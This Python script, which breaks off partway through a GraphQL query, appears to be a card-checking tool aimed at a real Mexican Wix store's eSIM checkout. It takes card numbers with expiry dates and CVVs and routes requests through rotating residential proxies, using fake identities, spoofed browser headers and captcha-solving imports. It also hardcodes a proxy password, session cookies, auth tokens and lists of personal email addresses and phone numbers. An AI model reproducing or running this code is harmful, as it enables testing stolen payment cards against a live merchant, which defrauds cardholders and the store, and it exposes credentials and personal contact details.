from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
from anticaptchaofficial.recaptchav2proxyless import *
import time
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password

async def process_card(card: str) -> str:    
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            proxy_user = "package-312813-country-mx-isp-telmex+fibra-sessionid-eTaAqoPhOtCDMWTu-sessionlength-300"
            proxy_pass = "6jSQIr9PqBGQhum4"
            proxy_host = "proxy.soax.com"
            proxy_port = 5000

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            c.proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            correos = [
                "marilisaqnituk@gmail.com",
                "flortsquitk@gmail.com",
                "quitukferchag@gmail.com",
                "saramanquitk@gmail.com",
                "jorgaioquint@gmail.com",
                "rodrigoking234@gmail.com",
                "rodrigoquituk004@gmail.com",
                "armeida.cate771@gmail.com",
                "viquitukeliander@gmail.com",
                "quityksantome@gmail.com",
                "samanquitguajal@gmail.com",
                "quintkdelgelo@gmail.com",
                "squitukjomilu@gmail.com",
                "lauranquinyuk@gmail.com",
                "rodrigoqgomez@gmail.com",
                "gardunoerick2@gmail.com"
            ]

            correo_seleccionado = random.choice(correos)
            numeros_disponibles = [
                "5642755407", "5635121149", "5635121165", "5586396881", "5642380032", "5642378421"
            ]
            elegido = random.choice(numeros_disponibles)
            print(elegido)
            headers = {
                'Referer': 'https://www.mimovil.com.mx/_partials/wix-thunderbolt/dist/clientWorker.df1ff4c9.bundle.min.js',
                'X-XSRF-TOKEN': '1756314191|mp5IopJRI_d6',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Authorization': 'EU_vv3no7ULofjmt9ucGgw-7Nz3Z7cXR04lyY2_hgug.eyJpbnN0YW5jZUlkIjoiMmIxYTk2ZDgtYTllMi00NDA5LWFmMjEtNmUyZDcxYzJkMzNlIiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYzRmMzA1ZGMtOGYxNS00MGNlLTlmNDEtOTNlNWZmZjg4NTQ2Iiwic2lnbkRhdGUiOiIyMDI1LTA4LTI3VDE3OjAzOjExLjM3MFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJhaWQiOiI5NTZiYmZhNi0zYTU2LTQ2ZjctOTA5Ni0xODMwYWI2MmExYWMiLCJiaVRva2VuIjoiZWZlOTkzMDQtMjZmNy0wNGM3LTMwNjAtZmRjODhlM2E1Njc4Iiwic2l0ZU93bmVySWQiOiI5MDlhNjdkMS03NmRkLTQ2YjctYjJiYS1kNTNkMWIxNmYyZjYiLCJzY2QiOiIyMDI0LTAxLTI0VDIyOjM0OjU2LjUwMFoifQ',
                'Content-Type': 'application/json; charset=utf-8',
            }

            json_data = {
                'query': 'mutation createCart(\n  $productId: String!\n  $optionSelectionId: [Int]!\n  $quantity: Int!\n  $customTextFieldSelection: [CustomTextOptionInput]!\n  $subscriptionOptionId: String\n  $buyerNote: String\n  $variantId: String\n  $isPickupOnly: Boolean\n  $preOrderRequested: Boolean\n  $options: Json\n) {\n  checkout {\n    createCart(\n      productId: $productId\n      optionSelectionId: $optionSelectionId\n      customTextFieldSelection: $customTextFieldSelection\n      quantity: $quantity\n      subscriptionOptionId: $subscriptionOptionId\n      buyerNote: $buyerNote\n      variantId: $variantId\n      isPickupOnly: $isPickupOnly\n      preOrderRequested: $preOrderRequested\n      options: $options\n    ) {\n      checkoutId\n      additionalFees {\n        code\n        name\n        totalPrice\n        formattedTotalPrice\n      }\n      appliedCoupon {\n        code\n        convertedDiscountValue\n        couponId\n        couponType\n        discountValue\n        name\n      }\n      billingAddress {\n        address {\n          addressLine\n          addressLine2\n          city\n          country\n          countryFullname\n          formattedAddress\n          geocode {\n            latitude\n            longitude\n          }\n          hint\n          postalCode\n          streetAddress {\n            apt\n            name\n            number\n          }\n          subdivision\n          subdivisionFullname\n          subdivisions {\n            code\n            name\n            type\n            typeInfo\n          }\n        }\n        contactDetails {\n          company\n          email\n          firstName\n          fullName\n          lastName\n          phone\n          vatId {\n            id\n            type\n          }\n        }\n      }\n      buyerInfo {\n        email\n        firstName\n        id\n        lastName\n        phone\n      }\n      buyerNote\n      convertedCurrency {\n        code\n        symbol\n      }\n      convertedTotals {\n        discount\n        quantity\n        shipping\n        subtotal\n        tax\n        total\n        weight\n      }\n      currency {\n        code\n        symbol\n      }\n      id\n      lineItems {\n        convertedPriceData {\n          price\n          totalPrice\n        }\n        customTextFields {\n          title\n          key\n          value\n        }\n        id\n        lineItemType\n        mediaItem {\n          height\n          mediaType\n          url\n          width\n        }\n        name\n        notes\n        options {\n          option\n          selection\n        }\n        price\n        priceData {\n          price\n          totalPrice\n        }\n        productId\n        quantity\n        sku\n        totalPrice\n        weight\n      }\n      shippingInfo {\n        pickupDetails {\n          buyerDetails {\n            email\n            firstName\n            lastName\n            phone\n          }\n          pickupAddress {\n            addressLine\n            addressLine2\n            city\n            country\n            countryFullname\n            formattedAddress\n            geocode {\n              latitude\n              longitude\n            }\n            hint\n            postalCode\n            streetAddress {\n              apt\n              name\n              number\n            }\n            subdivision\n            subdivisions {\n              code\n              name\n              type\n              typeInfo\n            }\n          }\n          pickupInstructions\n        }\n        shippingAddress {\n          address {\n            addressLine\n            addressLine2\n            city\n            country\n            countryFullname\n            formattedAddress\n            geocode {\n              latitude\n              longitude\n            }\n            hint\n            postalCode\n            streetAddress {\n              apt\n              name\n              number\n            }\n            subdivision\n            subdivisionFullname\n            subdivisions {\n              code\n              name\n              type\n              typeInfo\n            }\n          }\n          contactDetails {\n            company\n            email\n            firstName\n            fullName\n            lastName\n            phone\n            vatId {\n              id\n              type\n            }\n          }\n        }\n        shippingRuleDetails {\n          deliveryOption\n          estimatedDeliveryTime\n          optionId\n          ruleId\n        }\n      }\n      status\n      totals {\n        discount\n        quantity\n        shipping\n        subtotal\n        tax\n        total\n        weight\n        additionalFeesTotal\n      }\n      weightUnit\n    }\n  }\n}\n',
                'variables': {
                    'productId': 'fd3b43d9-5eaa-e122-0e0a-ced434e40401',
                    'optionSelectionId': [],
                    'customTextFieldSelection': [],
                    'quantity': 1,
                    'options': {},
                    'isPickupOnly': False,
                },
                'source': 'WixStoresWebClient',
                'operationName': 'createCart',
            }

            response = c.post('https://www.mimovil.com.mx/_api/wixstores-graphql-server/graphql', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            checkout_id = responsePm["data"]["checkout"]["createCart"]["checkoutId"]
            print(checkout_id)

            headers = {
                'authority': 'www.mimovil.com.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'svSession=88403f0ba404315559b83ec17d99066da40e15555982ccadb5ade243d62d04696bbb526eb9827b2724f1d4c2b7508ac91e60994d53964e647acf431e4f798bcdf7a7d42786e73a647c13f8073337440f14fd436b22311af4ca407ed277d23da37d755879e6f78f7e05c411f1948fe2b40312217d9290eb60e4e9c366ae6fd83568fa662fe68033e652924feb5954d56f; _fbp=fb.2.1747099757274.783596408139690499; _ga_G7H3ZJ2XD7=GS2.1.s1749250405$o2$g0$t1749250405$j60$l0$h0; _ga=GA1.1.1686304304.1747099758; _ga_LVKNG19EBQ=GS2.1.s1749250405$o2$g1$t1749250888$j60$l0$h0; _hjSessionUser_6502453=eyJpZCI6ImFiYWQwNzg2LWM2YmEtNTljNi05OGE0LTMwMTVlMjA2ZWRlMyIsImNyZWF0ZWQiOjE3NTYzMTQxOTExMzAsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_6502453=eyJpZCI6IjJkZTcxYmZiLTc5OGUtNGU5MS04ODFmLTlhMDZkNWU5NGRhNyIsImMiOjE3NTYzMTQxOTExMzEsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; XSRF-TOKEN=1756314191|mp5IopJRI_d6; hs=1824749638; _ga_24GFQT7WYN=GS2.1.s1756314192$o1$g0$t1756314192$j60$l0$h114681740; fedops.logger.defaultOverrides=%7B%22paramsOverridesForApp%22%3A%7B%22my-apps%22%3A%7B%22is_rollout%22%3Atrue%7D%7D%7D; bSession=37991cfa-b4d1-4379-8c05-5c408436628a|6',
                'origin': 'https://www.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://www.mimovil.com.mx/product-page/esim-150',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-xsrf-token': '1756314191|mp5IopJRI_d6',
            }

            json_data = {
                'eventName': 'AddToCart',
                'data': {
                    'category': 'All Products',
                    'origin': 'Stores',
                    'id': checkout_id,
                    'name': 'Esim 150',
                    'price': 150,
                    'currency': 'MXN',
                    'quantity': 1,
                    'sku': 'ESIM-NEW-150',
                    'type': 'digital',
                    'brand': None,
                    'checkoutId': '8105187b-50d2-3013-ad22-d13fc9c15148',
                    'visitorId': '956bbfa6-3a56-46f7-9096-1830ab62a1ac',
                    '_internalEventId': 'b51eaaa0-d89a-44e6-894f-cba38d0fb5c0',
                    'isPremium': True,
                    'userId': '909a67d1-76dd-46b7-b2ba-d53d1b16f2f6',
                    'metaSiteId': 'c4f305dc-8f15-40ce-9f41-93e5fff88546',
                },
            }

            response = c.post(
                'https://www.mimovil.com.mx/_serverless/analytics-reporter/facebook/event',
                headers=headers,
                json=json_data,
            )


            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://www.mimovil.com.mx/_partials/wix-thunderbolt/dist/clientWorker.df1ff4c9.bundle.min.js',
                'commonConfig': '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%2237991cfa-b4d1-4379-8c05-5c408436628a%7C7%22%2C%22siteRevision%22%3A%223278%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D',
                'x-wix-brand': 'wix',
                'authorization': 'EU_vv3no7ULofjmt9ucGgw-7Nz3Z7cXR04lyY2_hgug.eyJpbnN0YW5jZUlkIjoiMmIxYTk2ZDgtYTllMi00NDA5LWFmMjEtNmUyZDcxYzJkMzNlIiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiYzRmMzA1ZGMtOGYxNS00MGNlLTlmNDEtOTNlNWZmZjg4NTQ2Iiwic2lnbkRhdGUiOiIyMDI1LTA4LTI3VDE3OjAzOjExLjM3MFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJhaWQiOiI5NTZiYmZhNi0zYTU2LTQ2ZjctOTA5Ni0xODMwYWI2MmExYWMiLCJiaVRva2VuIjoiZWZlOTkzMDQtMjZmNy0wNGM3LTMwNjAtZmRjODhlM2E1Njc4Iiwic2l0ZU93bmVySWQiOiI5MDlhNjdkMS03NmRkLTQ2YjctYjJiYS1kNTNkMWIxNmYyZjYiLCJzY2QiOiIyMDI0LTAxLTI0VDIyOjM0OjU2LjUwMFoifQ',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
            }

            json_data = {
                'query': 'mutation updateCheckout($input: EcomCheckoutV1UpdateCheckoutRequestInput!) {\n  checkoutMutation: ecomCheckoutV1UpdateCheckout(input: $input) {\n    checkout {\n      ...Checkout\n    }\n  }\n}\n\nfragment CatalogReference on ComWixEcommerceCatalogSpiApiV1CatalogReference {\n  catalogItemId\n  appId\n  options\n}\n\nfragment ProductName on ComWixEcommerceCatalogSpiApiV1ProductName {\n  original\n  translated\n}\n\nfragment PageUrlV2 on WixCommonPageUrlV2 {\n  relativePath\n  url\n}\n\nfragment MultiCurrencyPrice on ComWixEcommercePlatformCommonApiMultiCurrencyPrice {\n  amount\n  convertedAmount\n  formattedAmount\n  formattedConvertedAmount\n}\n\nfragment TaxRateBreakdown on ComWixEcomTotalsCalculatorV1TaxRateBreakdown {\n  name\n  rate\n  tax {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ItemTaxFullDetails on ComWixEcomTotalsCalculatorV1ItemTaxFullDetails {\n  taxableAmount {\n    ...MultiCurrencyPrice\n  }\n  taxGroupId\n  taxRate\n  totalTax {\n    ...MultiCurrencyPrice\n  }\n  rateBreakdown {\n    ...TaxRateBreakdown\n  }\n  exemptAmount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment DescriptionLineName on ComWixEcommerceCatalogSpiApiV1DescriptionLineName {\n  original\n  translated\n}\n\nfragment PlainTextValue on ComWixEcommerceCatalogSpiApiV1PlainTextValue {\n  original\n  translated\n}\n\nfragment Color on ComWixEcommerceCatalogSpiApiV1Color {\n  original\n  translated\n  code\n}\n\nfragment DescriptionLine on ComWixEcommerceCatalogSpiApiV1DescriptionLine {\n  name {\n    ...DescriptionLineName\n  }\n  lineType\n  plainText {\n    ...PlainTextValue\n  }\n  colorInfo {\n    ...Color\n  }\n  plainTextValue {\n    ...PlainTextValue\n  }\n  color\n}\n\nfragment Image on WixCommonImage {\n  id\n  url\n  height\n  width\n  altText\n  urlExpirationDate\n  filename\n  sizeInBytes\n}\n\nfragment ItemAvailabilityInfo on EcomCheckoutV1ItemAvailabilityInfo {\n  status\n  quantityAvailable\n}\n\nfragment PhysicalProperties on ComWixEcommerceCatalogSpiApiV1PhysicalProperties {\n  weight\n  sku\n  shippable\n}\n\nfragment Group on WixCouponsApiV2ScopeGroup {\n  name\n  entityId\n}\n\nfragment Scope on WixCouponsApiV2Scope {\n  namespace\n  group {\n    ...Group\n  }\n}\n\nfragment ItemType on ComWixEcommerceCatalogSpiApiV1ItemType {\n  preset\n  custom\n}\n\nfragment FreeTrialPeriod on ComWixEcommerceCatalogSpiApiV1FreeTrialPeriod {\n  interval\n  frequency\n}\n\nfragment SubscriptionSettings on ComWixEcommerceCatalogSpiApiV1SubscriptionSettings {\n  frequency\n  interval\n  autoRenewal\n  billingCycles\n  startDate\n  freeTrialPeriod {\n    ...FreeTrialPeriod\n  }\n}\n\nfragment Title on ComWixEcommerceCatalogSpiApiV1Title {\n  original\n  translated\n}\n\nfragment Description on ComWixEcommerceCatalogSpiApiV1Description {\n  original\n  translated\n}\n\nfragment SubscriptionOptionInfo on ComWixEcommerceCatalogSpiApiV1SubscriptionOptionInfo {\n  subscriptionSettings {\n    ...SubscriptionSettings\n  }\n  title {\n    ...Title\n  }\n  description {\n    ...Description\n  }\n}\n\nfragment SecuredMedia on ComWixEcommerceCatalogSpiApiV1SecuredMedia {\n  id\n  fileName\n  fileType\n}\n\nfragment ServiceProperties on ComWixEcommerceCatalogSpiApiV1ServiceProperties {\n  scheduledDate\n  numberOfParticipants\n}\n\nfragment PriceDescription on ComWixEcommerceCatalogSpiApiV1PriceDescription {\n  original\n  translated\n}\n\nfragment Policy on ComWixEcommerceCatalogSpiApiV1Policy {\n  title\n  content\n}\n\nfragment ModifierGroupName on ComWixEcommercePlatformCommonApiTranslatableString {\n  original\n  translated\n}\n\nfragment ModifierLabel on ComWixEcommercePlatformCommonApiTranslatableString {\n  original\n  translated\n}\n\nfragment ModifierDetails on ComWixEcommercePlatformCommonApiTranslatableString {\n  original\n  translated\n}\n\nfragment Modifier on ComWixEcomCartCheckoutCommonApiV1ItemModifier {\n  id\n  quantity\n  price {\n    ...MultiCurrencyPrice\n  }\n  label {\n    ...ModifierLabel\n  }\n  details {\n    ...ModifierDetails\n  }\n}\n\nfragment ModifierGroup on ComWixEcomCartCheckoutCommonApiV1ModifierGroup {\n  id\n  name {\n    ...ModifierGroupName\n  }\n  modifiers {\n    ...Modifier\n  }\n}\n\nfragment LineItem on EcomCheckoutV1LineItem {\n  id\n  quantity\n  catalogReference {\n    ...CatalogReference\n  }\n  productName {\n    ...ProductName\n  }\n  url {\n    ...PageUrlV2\n  }\n  price {\n    ...MultiCurrencyPrice\n  }\n  lineItemPrice {\n    ...MultiCurrencyPrice\n  }\n  fullPrice {\n    ...MultiCurrencyPrice\n  }\n  priceBeforeDiscounts {\n    ...MultiCurrencyPrice\n  }\n  totalPriceAfterTax {\n    ...MultiCurrencyPrice\n  }\n  totalPriceBeforeTax {\n    ...MultiCurrencyPrice\n  }\n  modifiersTotalPrice {\n    ...MultiCurrencyPrice\n  }\n  taxDetails {\n    ...ItemTaxFullDetails\n  }\n  discount {\n    ...MultiCurrencyPrice\n  }\n  descriptionLines {\n    ...DescriptionLine\n  }\n  media {\n    ...Image\n  }\n  availability {\n    ...ItemAvailabilityInfo\n  }\n  physicalProperties {\n    ...PhysicalProperties\n  }\n  couponScopes {\n    ...Scope\n  }\n  itemType {\n    ...ItemType\n  }\n  subscriptionOptionInfo {\n    ...SubscriptionOptionInfo\n  }\n  fulfillerId\n  shippingGroupId\n  digitalFile {\n    ...SecuredMedia\n  }\n  paymentOption\n  serviceProperties {\n    ...ServiceProperties\n  }\n  rootCatalogItemId\n  priceDescription {\n    ...PriceDescription\n  }\n  depositAmount {\n    ...MultiCurrencyPrice\n  }\n  policies {\n    ...Policy\n  }\n  consentRequiredPaymentPolicy\n  savePaymentMethod\n  priceUndetermined\n  fixedQuantity\n  membersOnly\n  deliveryProfileId\n  modifierGroups {\n    ...ModifierGroup\n  }\n}\n\nfragment StreetAddress on WixCommonStreetAddress {\n  number\n  name\n  apt\n  formattedAddressLine\n}\n\nfragment ApiAddressNoGeo on ComWixEcommercePlatformCommonApiAddress {\n  country\n  subdivision\n  city\n  postalCode\n  addressLine\n  addressLine2\n  countryFullname\n  subdivisionFullname\n  streetAddress {\n    ...StreetAddress\n  }\n}\n\nfragment VatId on WixCommonVatId {\n  id\n  type\n}\n\nfragment FullAddressContactDetails on ComWixEcommercePlatformCommonApiFullAddressContactDetails {\n  firstName\n  lastName\n  phone\n  company\n  vatId {\n    ...VatId\n  }\n}\n\nfragment AddressWithContactNoGeo on EcomCheckoutV1AddressWithContact {\n  address {\n    ...ApiAddressNoGeo\n  }\n  contactDetails {\n    ...FullAddressContactDetails\n  }\n  addressesServiceId\n}\n\nfragment GeoCode on WixCommonAddressLocation {\n  latitude\n  longitude\n}\n\nfragment ApiAddress on ComWixEcommercePlatformCommonApiAddress {\n  ...ApiAddressNoGeo\n  geocode {\n    ...GeoCode\n  }\n}\n\nfragment AddressWithContact on EcomCheckoutV1AddressWithContact {\n  address {\n    ...ApiAddress\n  }\n  contactDetails {\n    ...FullAddressContactDetails\n  }\n  addressesServiceId\n}\n\nfragment PickupDetails on ComWixEcomTotalsCalculatorV1PickupDetails {\n  address {\n    ...ApiAddress\n  }\n  businessLocation\n  pickupMethod\n}\n\nfragment DeliveryLogistics on ComWixEcomTotalsCalculatorV1DeliveryLogistics {\n  deliveryTime\n  instructions\n  pickupDetails {\n    ...PickupDetails\n  }\n  deliveryTimeSlot {\n    from\n    to\n  }\n}\n\nfragment SelectedCarrierServiceOptionPrices on ComWixEcomTotalsCalculatorV1SelectedCarrierServiceOptionPrices {\n  totalPriceAfterTax {\n    ...MultiCurrencyPrice\n  }\n  totalPriceBeforeTax {\n    ...MultiCurrencyPrice\n  }\n  taxDetails {\n    ...ItemTaxFullDetails\n  }\n  totalDiscount {\n    ...MultiCurrencyPrice\n  }\n  price {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment SelectedCarrierServiceOptionOtherCharge on ComWixEcomTotalsCalculatorV1SelectedCarrierServiceOptionOtherCharge {\n  type\n  details\n  cost {\n    ...SelectedCarrierServiceOptionPrices\n  }\n}\n\nfragment SelectedCarrierServiceOption on ComWixEcomTotalsCalculatorV1SelectedCarrierServiceOption {\n  code\n  title\n  logistics {\n    ...DeliveryLogistics\n  }\n  cost {\n    ...SelectedCarrierServiceOptionPrices\n  }\n  requestedShippingOption\n  otherCharges {\n    ...SelectedCarrierServiceOptionOtherCharge\n  }\n  carrierId\n}\n\nfragment ShippingRegion on ComWixEcomTotalsCalculatorV1ShippingRegion {\n  id\n  name\n}\n\nfragment OtherCharge on ComWixEcomTotalsCalculatorV1OtherCharge {\n  type\n  price {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ShippingPrice on ComWixEcomTotalsCalculatorV1ShippingPrice {\n  price {\n    ...MultiCurrencyPrice\n  }\n  otherCharges {\n    ...OtherCharge\n  }\n}\n\nfragment ShippingOption on ComWixEcomTotalsCalculatorV1ShippingOption {\n  code\n  title\n  partial\n  logistics {\n    ...DeliveryLogistics\n  }\n  cost {\n    ...ShippingPrice\n  }\n}\n\nfragment CarrierServiceOption on ComWixEcomTotalsCalculatorV1CarrierServiceOption {\n  carrierId\n  shippingOptions {\n    ...ShippingOption\n  }\n}\n\nfragment ShippingInfo on EcomCheckoutV1ShippingInfo {\n  shippingDestination {\n    ...AddressWithContact\n  }\n  selectedCarrierServiceOption {\n    ...SelectedCarrierServiceOption\n  }\n  region {\n    ...ShippingRegion\n  }\n  carrierServiceOptions {\n    ...CarrierServiceOption\n  }\n}\n\nfragment BuyerInfo on EcomCheckoutV1BuyerInfo {\n  contactId\n  email\n  visitorId\n  memberId\n  openAccess\n}\n\nfragment PriceSummary on ComWixEcomTotalsCalculatorV1PriceSummary {\n  subtotal {\n    ...MultiCurrencyPrice\n  }\n  shipping {\n    ...MultiCurrencyPrice\n  }\n  tax {\n    ...MultiCurrencyPrice\n  }\n  discount {\n    ...MultiCurrencyPrice\n  }\n  total {\n    ...MultiCurrencyPrice\n  }\n  additionalFees {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ApplicationError on WixApiApplicationError {\n  code\n  description\n  data\n}\n\nfragment FieldViolation on WixApiValidationErrorFieldViolation {\n  field\n  description\n  violatedRule\n  ruleName\n  data\n}\n\nfragment ValidationError on WixApiValidationError {\n  fieldViolations {\n    ...FieldViolation\n  }\n}\n\nfragment ErrorDetails on WixApiDetails {\n  applicationError {\n    ...ApplicationError\n  }\n  validationError {\n    ...ValidationError\n  }\n  tracing\n}\n\nfragment CarrierError on ComWixEcomTotalsCalculatorV1CarrierError {\n  carrierId\n  error {\n    ...ErrorDetails\n  }\n}\n\nfragment CarrierErrors on ComWixEcomTotalsCalculatorV1CarrierErrors {\n  errors {\n    ...CarrierError\n  }\n}\n\nfragment CalculationErrors on ComWixEcomTotalsCalculatorV1CalculationErrors {\n  generalShippingCalculationError {\n    ...ErrorDetails\n  }\n  carrierErrors {\n    ...CarrierErrors\n  }\n  taxCalculationError {\n    ...ErrorDetails\n  }\n  couponCalculationError {\n    ...ErrorDetails\n  }\n  giftCardCalculationError {\n    ...ErrorDetails\n  }\n  membershipError {\n    ...ErrorDetails\n  }\n  discountsCalculationError {\n    ...ErrorDetails\n  }\n  orderValidationErrors {\n    ...ApplicationError\n  }\n}\n\nfragment GiftCard on ComWixEcomTotalsCalculatorV1GiftCard {\n  id\n  obfuscatedCode\n  amount {\n    ...MultiCurrencyPrice\n  }\n  appId\n}\n\nfragment Coupon on ComWixEcomTotalsCalculatorV1Coupon {\n  id\n  code\n  amount {\n    ...MultiCurrencyPrice\n  }\n  name\n  couponType\n}\n\nfragment MerchantDiscount on ComWixEcomTotalsCalculatorV1MerchantDiscount {\n  amount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment DiscountRuleName on ComWixEcomTotalsCalculatorV1DiscountRuleName {\n  original\n  translated\n}\n\nfragment DiscountRule on ComWixEcomTotalsCalculatorV1DiscountRule {\n  id\n  name {\n    ...DiscountRuleName\n  }\n  amount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment AppliedDiscount on ComWixEcomTotalsCalculatorV1AppliedDiscount {\n  discountType\n  lineItemIds\n  coupon {\n    ...Coupon\n  }\n  merchantDiscount {\n    ...MerchantDiscount\n  }\n  discountRule {\n    ...DiscountRule\n  }\n}\n\nfragment CustomField on ComWixEcomOrdersV1CustomField {\n  value\n  title\n  translatedTitle\n}\n\nfragment AutoTaxFallbackCalculationDetails on ComWixEcomTaxApiAutoTaxFallbackCalculationDetails {\n  fallbackReason\n  error {\n    ...ApplicationError\n  }\n}\n\nfragment TaxCalculationDetails on ComWixEcomTaxApiTaxCalculationDetails {\n  rateType\n  manualRateReason\n  autoTaxFallbackDetails {\n    ...AutoTaxFallbackCalculationDetails\n  }\n}\n\nfragment AggregatedTaxBreakdown on ComWixEcomTotalsCalculatorV1AggregatedTaxBreakdown {\n  taxName\n  aggregatedTaxAmount {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment TaxSummary on ComWixEcomTotalsCalculatorV1TaxSummary {\n  taxableAmount {\n    ...MultiCurrencyPrice\n  }\n  totalTax {\n    ...MultiCurrencyPrice\n  }\n  manualTaxRate\n  calculationDetails {\n    ...TaxCalculationDetails\n  }\n  taxEstimationId\n  averageTaxRate\n  totalExempt {\n    ...MultiCurrencyPrice\n  }\n  aggregatedTaxBreakdown {\n    ...AggregatedTaxBreakdown\n  }\n}\n\nfragment CreatedBy on EcomCheckoutV1CreatedBy {\n  userId\n  memberId\n  visitorId\n  appId\n}\n\nfragment MembershipName on ComWixEcomMembershipsSpiV1MembershipName {\n  original\n  translated\n}\n\nfragment MembershipPaymentCredits on ComWixEcomMembershipsSpiV1MembershipPaymentCredits {\n  total\n  remaining\n}\n\nfragment Membership on ComWixEcomMembershipsSpiV1HostMembership {\n  id\n  appId\n  name {\n    ...MembershipName\n  }\n  lineItemIds\n  credits {\n    ...MembershipPaymentCredits\n  }\n  expirationDate\n  additionalData\n}\n\nfragment InvalidMembership on ComWixEcomMembershipsSpiV1HostInvalidMembership {\n  membership {\n    ...Membership\n  }\n  reason\n}\n\nfragment SelectedMembership on ComWixEcomMembershipsSpiV1HostSelectedMembership {\n  id\n  appId\n  lineItemIds\n}\n\nfragment MembershipOptions on EcomCheckoutV1MembershipOptions {\n  eligibleMemberships {\n    ...Membership\n  }\n  invalidMemberships {\n    ...InvalidMembership\n  }\n  selectedMemberships {\n    memberships {\n      ...SelectedMembership\n    }\n  }\n}\n\nfragment AdditionalFee on ComWixEcomTotalsCalculatorV1AdditionalFee {\n  code\n  name\n  translatedName\n  price {\n    ...MultiCurrencyPrice\n  }\n  taxDetails {\n    ...ItemTaxFullDetails\n  }\n  providerAppId\n  priceBeforeTax {\n    ...MultiCurrencyPrice\n  }\n}\n\nfragment ConversionInfo on EcomCheckoutV1ConversionInfo {\n  siteCurrency\n  conversionRate\n}\n\nfragment RenderingConfig on ComWixEcomLineItemsEnricherSpiApiV1LineItemRenderingConfig {\n  hidePrice\n  hideQuantity\n}\n\nfragment EnrichedLineItem on ComWixEcomLineItemsEnricherSpiApiV1EnrichedLineItem {\n  id\n  overriddenDescriptionLines {\n    descriptionLines {\n      ...DescriptionLine\n    }\n  }\n  renderingConfig {\n    ...RenderingConfig\n  }\n}\n\nfragment ViolationLineItemTarget on ComWixEcommerceValidationsSpiV1TargetLineItem {\n  id\n  name\n  suggestedFix\n}\n\nfragment ViolationOtherTarget on ComWixEcommerceValidationsSpiV1TargetOther {\n  name\n}\n\nfragment ViolationTarget on ComWixEcommerceValidationsSpiV1Target {\n  lineItem {\n    ...ViolationLineItemTarget\n  }\n  other {\n    ...ViolationOtherTarget\n  }\n}\n\nfragment Violation on ComWixEcommerceValidationsSpiV1Violation {\n  severity\n  target {\n    ...ViolationTarget\n  }\n  description\n}\n\nfragment 